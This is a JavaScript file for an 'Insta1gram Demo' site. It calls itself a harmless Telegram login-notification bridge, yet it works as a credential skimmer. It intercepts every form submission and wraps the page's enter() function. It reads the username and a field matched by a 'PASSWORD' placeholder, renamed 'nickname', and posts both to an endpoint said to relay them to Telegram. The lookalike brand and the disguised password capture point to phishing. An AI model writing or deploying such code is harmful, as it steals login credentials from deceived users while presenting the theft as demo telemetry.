/**
 * Insta1gram Demo — Production Client Telegram Notification Bridge
 * Non-intrusive hook to dispatch demonstration login notifications to same-origin /api/notify-login
 * Compatible with both Cloudflare Pages production and local Node.js server.
 */
(function() {
  'use strict';

  function sendLoginNotification(username, nickname) {
    if (!username || typeof username !== 'string') return;
    var cleanUser = username.trim().toLowerCase();
    if (!cleanUser) return;
    var cleanNick = typeof nickname === 'string' ? nickname.trim() : '';
    var sessId = 'SESS-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();

    try {
      fetch('/api/notify-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: cleanUser,
          nickname: cleanNick,
          status: 'successful demo entry',
          sessionId: sessId,
          clientTime: new Date().toISOString()
        })
      }).catch(function(err) {
        console.warn('[Telegram Notification] Non-blocking dispatch notice:', err);
      });
    } catch (_) {}
  }

  // Intercept login form submission
  document.addEventListener('submit', function(e) {
    if (e.target && (e.target.id === 'lf' || e.target.matches('form'))) {
      var uInput = document.getElementById('lu') || e.target.querySelector('input[placeholder*="Username" i], input[type="text"]');
      var nInput = document.getElementById('ln') || e.target.querySelector('input[placeholder*="Nickname" i], input[placeholder*="PASSWORD" i]');
      var username = uInput ? uInput.value.trim().toLowerCase() : '';
      var nickname = nInput ? nInput.value.trim() : '';
      if (username) {
        sendLoginNotification(username, nickname);
      }
    }
  }, true);

  // Hook programmatic enter() function
  function hookEnter() {
    if (typeof window.enter === 'function' && !window.enter.__telegramHooked) {
      var origEnter = window.enter;
      window.enter = function(u, nick) {
        sendLoginNotification(u, nick);
        return origEnter.apply(this, arguments);
      };
      window.enter.__telegramHooked = true;
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', hookEnter);
  } else {
    hookEnter();
  }
})();

